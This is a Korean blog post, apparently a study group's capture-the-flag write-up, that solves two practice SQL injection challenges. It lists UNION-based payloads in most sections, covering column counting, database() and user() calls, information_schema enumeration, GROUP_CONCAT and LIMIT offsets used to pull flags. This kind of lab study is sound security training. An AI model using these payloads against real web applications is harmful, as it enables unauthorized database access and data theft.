---
layout: post
title:  노말틱 모의해킹 스터디 6주차 워게임 (1) sqli1, sql2
author: leewoojin
date: 2025-05-09 00:00:00 +0900
categories: [Pentest, W6]
tags: []
---

해당 문제는 게시판의 `search` 파라미터에서 SQL Injection을 통해 **숨겨진 데이터(flag)** 를 추출하는 문제였습니다.

사전에 [PortSwigger Labs](https://portswigger.net/web-security/sql-injection)에서 SQLi를 학습했기 때문에 쉽게 접근할 수 있을 줄 알았는데, 생각보다 고전했습니다.  

---

## 🧪 시도 과정 및 풀이

### 🎯 시도 1 – SQL Injection이 가능한가?
```
normaltic' OR '1'='1-- 
```

✅ SQL 인젝션 성공 확인

<img src="https://github.com/user-attachments/assets/9a59b257-028f-4390-bbd1-c3f857d3c01a" width="600"/>

### 🎯 시도 2 – 컬럼 수 확인
```
normaltic' ORDER BY 1 --    ✅ 성공  
normaltic' ORDER BY 5 --    ❌ 실패
```
✅ 컬럼 수는 4개로 추정됨

### 🎯 시도 3 – 출력 컬럼 식별
```
normaltic' UNION SELECT 1,2,3,4 -- 
```
✅ 1~4 전부 출력 가능

<img src="https://github.com/user-attachments/assets/2c96a69b-2772-4aa3-b803-fa0839f7e887" width="600"/>

### 🎯 시도 4 – DB 이름 확인
```
normaltic' UNION SELECT database(),2,3,4 -- 
```
✅ DB 이름은 sqli_1

<img src="https://github.com/user-attachments/assets/27d3cde4-c5cf-4863-a971-c8866cc36c1d" width="600"/>

### 🎯 시도 5 – 테이블명 추출
```
normaltic' UNION SELECT table_name,2,3,4 FROM information_schema.tables WHERE table_schema='sqli_1' -- 
```
✅ `flag_table`, `plusFlag_Table`, `user_info` 발견

<img src="https://github.com/user-attachments/assets/b584829e-0eae-4d9b-87b2-3c41b63566fa" width="600"/>

### 🎯 시도 6 – 각 테이블의 컬럼명 추출
✅ flag_table
```
normaltic' UNION SELECT column_name,2,3,4 FROM information_schema.columns WHERE table_name='flag_table' -- 
```
<img src="https://github.com/user-attachments/assets/e75dcf42-edc2-4c78-9b7e-909bf3c237bf" width="600"/>

✅ plusFlag_Table
```
normaltic' UNION SELECT column_name,2,3,4 FROM information_schema.columns WHERE table_name='plusFlag_Table' -- 
```
<img src="https://github.com/user-attachments/assets/f7caef9f-82c7-4396-8a7d-8d3eebaa13d0" width="600"/>
✅ user_info

```
normaltic' UNION SELECT column_name,2,3,4 FROM information_schema.columns WHERE table_name='user_info' 
--
``` 
<img src="https://github.com/user-attachments/assets/058762f9-5f6d-40a8-9062-e4ce876febed" width="600"/>

### 🎯 시도 7 – 플래그 추출 (flag_table)
```
normaltic' UNION SELECT flag,2,3,4 FROM flag_table -- 
```
✅ flag 컬럼에서 플래그 출력 성공

🎯 시도 8 – 또 다른 flag 컬럼? (plusFlag_Table)
```
normaltic' UNION SELECT idx,flag,3,4 FROM plusFlag_Table -- 
```
✅ 두 번째 플래그 후보도 발견

----

검색창에 `normaltic`을 입력한 결과, 정상적인 검색 결과 동작을 확인할 수 있었습니다. 

<img width="1175" alt="Image" src="https://github.com/user-attachments/assets/56890963-3229-4c48-a687-a9143f60d1d7" />

실수로 SQL 주석(--)을 붙이지 않고 `' OR '1'='1` 만 입력해봤더니 
`doldol`의 계정에서  Info 부분에서 `"my name is normaltic"`
출력하는 것을 확인했습니다. 

<img width="1172" alt="Image" src="https://github.com/user-attachments/assets/b44f8ecc-3341-4a44-b0b4-2b40fd518335" />

`' OR '1'='1-- `  입력해봤더니 `doldol`의 원래 계정대로 출력되는 것을 확인할 수 있었습니다. 

<img width="1155" alt="Image" src="https://github.com/user-attachments/assets/c1126c8b-2fff-4213-bae1-d7d3f5a5c4ae" />


`doldol' UNION SELECT 1,2,3,4,5,6-- `를 입력하여 컬럼이 6개라는 것을 확인했습니다. 
<img width="1161" alt="Image" src="https://github.com/user-attachments/assets/9a5de7b2-6b75-44ef-85ce-3016283d22ac" />

`doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,6-- `
Info부분에 6이 찍히는 것을 확인할 수 있습니다. 
<img width="1156" alt="Image" src="https://github.com/user-attachments/assets/fabf6106-9485-4ed5-95d1-1d6c48a8fe55" />

`doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,database()-- `
DB 이름이 sqli_5 라는 것을 확인할 수 있습니다.
<img width="1168" alt="Image" src="https://github.com/user-attachments/assets/d00cfe96-5a49-49ee-bc5a-f4ebcde4e707" />

```sql
doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,table_name FROM information_schema.tables WHERE table_schema='sqli_5'-- 
```
> 테이블 이름이 flag_honey 라는 것을 확인 
<img width="1142" alt="Image" src="https://github.com/user-attachments/assets/c9326907-2abc-4960-94ed-0da66ac5f188" />

```sql
doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,column_name FROM information_schema.columns WHERE table_name='flag_honey'-- 
```
> flag_honey 테이블에서 flag를 발견
<img width="1145" alt="Image" src="https://github.com/user-attachments/assets/6dc80c99-7926-46d9-95d7-052aa429cad8" />

```sql
doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,flag FROM flag_honey-- 
```
> 하핳 아니라네 ;ㅁ;
<img width="1149" alt="Image" src="https://github.com/user-attachments/assets/ab915c23-1d40-4a97-b22d-97776372ee7a" />

```sql
doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,table_name FROM information_schema.tables--
```
> 어디서 놓친게 있나 생각해봐도 없는데 information_schema.tables에 where 조건문을 안쓰면 테이블이 왕창 나온다는 것을 기억하고 확인해보니 CHARACTER_SETS 테이블이 있는 것을 확인

<img width="1171" alt="Image" src="https://github.com/user-attachments/assets/9ed76ed7-ada8-4001-a22e-eeaada16c9aa" />

### ❗ 여기서부터 삽질의 하이라이트

```sql
doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,column_name FROM information_schema.columns WHERE table_name='CHARACTER_SETS'--
```
> CHARACTER_SET_NAME 컬럼 발견
<img width="1127" alt="Image" src="https://github.com/user-attachments/assets/f1c5eed3-1c11-4373-b2bd-e7adeac12530" />

```sql
doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,CHARACTER_SET_NAME FROM CHARACTER_SETS-- 
```
> 이렇게 했더니 안나온다 왜?!?!?!?!?!?!?

`doldol' AND 1=0 UNION SELECT 1,2,3,4,5,user()-- `
> 이게 또 database()만 있는게 아니구나 
<img width="1157" alt="Image" src="https://github.com/user-attachments/assets/f5eab93f-3b99-4071-bbb9-8843a1f0b798" />

```sql
doldol' and '1'='0' UNION SELECT 1,2,3,4,5,table_name FROM information_schema.tables LIMIT 1,1-- 
```
> information_schema.tables 에서 하나만 나온다는게 Limit 가 걸려있다는 거였는데 너무 늦게 알았다..

<img width="1138" alt="Image" src="https://github.com/user-attachments/assets/a84caa94-4b7f-438d-9ca9-bfce2e48b644" />


### 정신 차린 구간 

```sql
doldol' AND '1'='0' UNION SELECT 1,2,3,4,5,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'--
```
> flag_honey 테이블 말고도 game_user,secret 존재한다는 것을 확인 
<img width="1141" alt="Image" src="https://github.com/user-attachments/assets/31aa482f-907e-410d-aed4-0b3b285b1627" />

```sql
doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,column_name FROM information_schema.columns WHERE table_name='secret'-- 
```
> 수상해보이는 sceret 테이블에서 flag 컬럼을 확인했습니다.
<img width="1145" alt="Image" src="https://github.com/user-attachments/assets/32a7d3b5-0ca0-4439-a0b6-ed436da71030" />

```sql	
doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,flag FROM secret-- 
```
> 하핳하.. 또 속았다. 
<img width="1130" alt="Image" src="https://github.com/user-attachments/assets/897b0be2-2878-45b1-86c6-a6fde2647e87" />

```sql
doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,flag FROM secret LIMIT 1,1-- 
```
> 휴 드디어 찾았다


### 문제에서 배운 것 정리 
SQL에서 `LIMIT`은 **쿼리 결과의 행 수를 제한**할 때 사용됩니다.  
MySQL 기준으로 `LIMIT a, b`는 다음을 의미합니다:

- `a` : **건너뛸 행(row)의 개수** (offset)
- `b` : **가져올 행(row)의 개수**

```
... FROM secret LIMIT 0,1--  → 첫 번째 레코드  
... FROM secret LIMIT 1,1--  → 두 번째 레코드  
... FROM secret LIMIT 2,1--  → 세 번째 레코드
```
[총 걸린 기간 : 2일]